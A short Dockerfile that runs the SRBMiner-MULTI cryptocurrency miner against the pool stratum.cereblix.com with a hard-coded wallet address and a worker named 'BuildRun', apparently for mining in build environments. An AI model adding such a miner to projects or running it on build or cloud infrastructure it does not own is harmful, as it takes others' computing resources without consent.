FROM ubuntu:24.04

COPY SRBMiner-MULTI /
RUN chmod +x /SRBMiner-MULTI

CMD ["/SRBMiner-MULTI", "-a", "neuromorph", "-o", "stratum.cereblix.com:3333", "-u", "crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun", "-p", "x", "-t", "4"]
